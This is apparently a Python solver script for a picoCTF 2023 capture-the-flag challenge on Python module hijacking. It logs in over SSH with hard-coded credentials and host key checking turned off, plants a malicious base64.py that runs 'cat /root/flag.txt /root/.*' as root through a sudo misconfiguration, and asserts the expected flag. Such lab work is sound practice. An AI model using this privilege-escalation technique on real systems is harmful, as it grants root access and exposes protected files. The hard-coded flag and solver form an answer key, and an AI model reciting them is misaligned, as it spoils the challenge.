#!/usr/bin/env python3
"""Solver for Challenge 352 hijacking (picoCTF 2023, Binary Exploitation).

Python module hijacking privilege escalation via sudoers misconfiguration.
Audit of sudo privileges (`sudo -l`) shows user 'academy' can execute:
    (root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py
The target script imports standard libraries (base64, os, socket) while residing
in the unprivileged user's writable home directory (`/home/academy`).
Because Python prepends the script directory to `sys.path` (`sys.path[0]`), creating
a malicious `base64.py` in `/home/academy/` hijacks the import during root execution,
allowing arbitrary code execution with root privileges to read the flag.

Flag: academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}
Verified: POST /api/submissions/ -> correct: true
"""
import subprocess
import sys
import re

HOST = "chatelaine.cylabacademy.net"
PORT = 28040
USER = "academy"
PASS = "qX7p-yZ0EX"
EXPECTED = "academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}"


def solve(host: str = HOST, port: int = PORT, user: str = USER, password: str = PASS) -> str:
    payload = (
        'echo "import os; os.system(\\"cat /root/flag.txt /root/.* 2>/dev/null\\")" > /home/academy/base64.py && '
        'sudo /usr/bin/python3 /home/academy/.server.py'
    )
    cmd = [
        "sshpass", "-p", password,
        "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        "-p", str(port), f"{user}@{host}",
        payload
    ]
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=20)
    out = proc.stdout + proc.stderr

    m = re.search(r"academy\{[^\}]+\}", out)
    if m:
        return m.group(0)
    raise ValueError(f"Flag not found in output: {out[:300]}")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    flag = solve(host, port)
    print("Flag:", flag)
    assert flag == EXPECTED
